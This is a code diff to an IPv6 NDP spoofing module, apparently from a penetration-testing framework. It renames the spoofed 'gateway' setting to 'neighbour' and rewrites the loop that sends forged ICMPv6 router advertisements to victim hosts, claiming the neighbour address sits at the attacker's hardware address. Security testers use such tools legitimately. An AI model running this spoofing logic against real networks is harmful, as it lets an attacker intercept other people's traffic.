@@ -13,7 +13,7 @@ import (
 
 type NDPSpoofer struct {
 	session.SessionModule
-	gwAddress net.IP
+	neighbour net.IP
 	addresses []net.IP
 	ban       bool
 	waitGroup *sync.WaitGroup
@@ -32,7 +32,7 @@ func NewNDPSpoofer(s *session.Session) *NDPSpoofer {
 	mod.AddParam(session.NewStringParameter("ndp.spoof.targets", "", "", "Comma separated list of IPv6 addresses, "+
 		"MAC addresses or aliases to spoof."))
 
-	mod.AddParam(session.NewStringParameter("ndp.spoof.gateway", "fe80::1", "", "Gateway address to spoof."))
+	mod.AddParam(session.NewStringParameter("ndp.spoof.neighbour", "fe80::1", "", "Neighbour IPv6 address to spoof."))
 
 	mod.AddHandler(session.NewModuleHandler("ndp.spoof on", "",
 		"Start NDP spoofer.",
@@ -76,12 +76,12 @@ func (mod NDPSpoofer) Author() string {
 
 func (mod *NDPSpoofer) Configure() error {
 	var err error
-	var gwaddr, targets string
+	var neigh, targets string
 
-	if err, gwaddr = mod.StringParam("ndp.spoof.gateway"); err != nil {
+	if err, neigh = mod.StringParam("ndp.spoof.neighbour"); err != nil {
 		return err
-	} else if mod.gwAddress = net.ParseIP(gwaddr); mod.gwAddress == nil {
-		return fmt.Errorf("can't parse gateway address %s", gwaddr)
+	} else if mod.neighbour = net.ParseIP(neigh); mod.neighbour == nil {
+		return fmt.Errorf("can't parse neighbour address %s", neigh)
 	} else if err, targets = mod.StringParam("ndp.spoof.targets"); err != nil {
 		return err
 	}
@@ -126,16 +126,15 @@ func (mod *NDPSpoofer) Start() error {
 		defer mod.waitGroup.Done()
 
 		for mod.Running() {
-			for ip, mac := range mod.getTargets(true) {
+			for victimAddr, victimHW := range mod.getTargets(true) {
+				victimIP := net.ParseIP(victimAddr)
 
-				srcHW := mod.Session.Interface.HW
-				srcIP := mod.gwAddress
-				dstHW := mac
-				dstIP := net.ParseIP(ip)
+				mod.Debug("we're saying to %s(%s) that %s is us(%s)",
+					victimIP, victimHW,
+					mod.neighbour,
+					mod.Session.Interface.HW)
 
-				mod.Debug("neigh_hw(ours)=%s src_ip(neigh)=%s victim_hw=%s victim_ip=%s", srcHW, srcIP, dstHW, dstIP)
-
-				if err, packet := packets.ICMP6RouterAdvertisement(srcHW, srcIP, dstHW, dstIP, srcIP); err != nil {
+				if err, packet := packets.ICMP6RouterAdvertisement(mod.Session.Interface.HW, mod.neighbour, victimHW, victimIP, mod.neighbour); err != nil {
 					mod.Error("error creating packet: %v", err)
 				} else if err = mod.Session.Queue.Send(packet); err != nil {
 					mod.Error("error while sending packet: %v", err)
